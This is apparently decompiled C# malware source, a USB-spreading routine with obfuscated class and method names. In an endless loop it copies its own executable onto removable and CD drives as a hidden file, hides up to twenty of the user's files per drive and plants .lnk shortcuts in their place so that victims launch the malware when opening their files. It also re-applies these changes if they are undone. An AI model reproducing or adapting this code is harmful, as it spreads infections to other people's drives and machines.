using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns5;

namespace ns2;

internal class Class2
{
	public class Class3
	{
		public string string_0;

		public List<string> list_0;

		public List<string> list_1;

		public Class3()
		{
			list_0 = new List<string>();
			list_1 = new List<string>();
		}
	}

	internal bool bool_0;

	internal Thread thread_0;

	public string string_0;

	public Collection collection_0;

	public Class2()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		bool_0 = false;
		thread_0 = null;
		collection_0 = new Collection();
	}

	public unsafe void method_0()
	{
		void* ptr = stackalloc byte[8];
		thread_0 = null;
		Class24.smethod_56(this);
		thread_0 = Thread.CurrentThread;
		bool_0 = false;
		while (!bool_0)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				*(int*)ptr = 0;
				while (*(int*)ptr < drives.Length)
				{
					DriveInfo driveInfo = drives[*(int*)ptr];
					Class3 @class;
					if (!collection_0.Contains(driveInfo.Name.ToLower()))
					{
						@class = new Class3();
						@class.string_0 = driveInfo.Name;
						collection_0.Add((object)@class, driveInfo.Name.ToLower(), (object)null, (object)null);
					}
					else
					{
						@class = (Class3)collection_0.get_Item(driveInfo.Name.ToLower());
					}
					if (bool_0)
					{
						goto end_IL_0024;
					}
					try
					{
						if (driveInfo.IsReady && (((driveInfo.TotalFreeSpace > 0L) & (driveInfo.DriveType == DriveType.Removable)) | (driveInfo.DriveType == DriveType.CDRom)))
						{
							try
							{
								if (!File.Exists(driveInfo.Name + string_0))
								{
									File.Copy(Application.get_ExecutablePath(), driveInfo.Name + string_0, overwrite: true);
									File.SetAttributes(driveInfo.Name + string_0, FileAttributes.Hidden);
								}
								string[] files = Directory.GetFiles(driveInfo.Name);
								*(int*)((byte*)ptr + 4) = 0;
								while (*(int*)((byte*)ptr + 4) < files.Length)
								{
									string text = files[*(int*)((byte*)ptr + 4)];
									if ((Operators.CompareString(Path.GetExtension(text)!.ToLower(), ".lnk", false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + string_0.ToLower(), false) != 0))
									{
										if (!@class.list_0.Contains(new FileInfo(text).get_Name()))
										{
											if (@class.list_0.Count < 20)
											{
												Class24.smethod_67(Class24.smethod_172(this, Path.GetExtension(text)), driveInfo, this, text);
												@class.list_0.Add(new FileInfo(text).get_Name());
												File.SetAttributes(text, FileAttributes.Hidden);
												@class.list_1.Add(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"));
											}
										}
										else if (@class.list_0.Contains(new FileInfo(text).get_Name()))
										{
											if (File.GetAttributes(text) != FileAttributes.Hidden)
											{
												File.SetAttributes(text, FileAttributes.Hidden);
											}
											if (!File.Exists(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"))
											{
												Class24.smethod_67(Class24.smethod_172(this, Path.GetExtension(text)), driveInfo, this, text);
											}
											else if (Operators.CompareString(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"), @class.list_1[@class.list_0.IndexOf(new FileInfo(text).get_Name())], false) != 0)
											{
												Class24.smethod_67(Class24.smethod_172(this, Path.GetExtension(text)), driveInfo, this, text);
											}
										}
									}
									checked
									{
										(*unchecked((int*)((byte*)ptr + 4)))++;
									}
								}
							}
							catch (Exception ex)
							{
								ProjectData.SetProjectError(ex);
								Exception ex2 = ex;
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.ClearProjectError();
					}
					checked
					{
						(*unchecked((int*)ptr))++;
					}
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(3000);
			continue;
			end_IL_0024:
			break;
		}
		thread_0 = null;
	}
}
